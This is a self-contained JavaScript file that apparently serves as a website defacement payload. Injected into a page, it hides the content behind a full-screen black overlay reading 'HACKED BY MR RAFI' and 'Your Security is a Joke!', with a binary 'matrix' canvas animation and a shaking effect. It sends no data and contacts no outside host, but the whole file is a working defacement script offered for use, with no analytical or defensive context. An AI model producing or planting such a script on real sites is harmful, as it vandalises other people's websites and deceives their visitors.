(function(){
    // Create Overlay Container
    const overlay = document.createElement('div');
    overlay.innerHTML = `
        <div style="
            position:fixed;
            top:0; left:0;
            width:100vw; height:100vh;
            background:black;
            display:flex;
            justify-content:center;
            align-items:center;
            flex-direction:column;
            z-index:999999999;
            font-family:'Courier New', monospace;
            overflow:hidden;">
            
            <canvas id="matrixCanvas" style="position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.2;"></canvas>
            
            <div style="font-size:5vw; color:#ff0000; text-shadow:0 0 20px #ff0000; animation:blink 1s infinite;">
                HACKED BY MR RAFI
            </div>
            
            <div style="font-size:2vw; color:#00ffff; margin-top:20px; text-shadow:0 0 15px #00ffff;">
                Your Security is a Joke!
            </div>
        </div>
        <style>
            @keyframes blink {
                0%, 100% { opacity:1; }
                50% { opacity:0.3; }
            }
        </style>
    `;
    document.body.appendChild(overlay);

    // Matrix Background Effect
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const letters = '01';
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function drawMatrix() {
        ctx.fillStyle = 'rgba(0,0,0,0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0F0';
        ctx.font = fontSize + 'px monospace';

        for (let i = 0; i < drops.length; i++) {
            const text = letters[Math.floor(Math.random() * letters.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);

            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }

    setInterval(drawMatrix, 50);

    // Glitch Shake Effect
    setInterval(() => {
        overlay.style.transform = `translate(${Math.random()*4-2}px, ${Math.random()*4-2}px)`;
        setTimeout(() => { overlay.style.transform = 'translate(0,0)'; }, 100);
    }, 1500);

})();
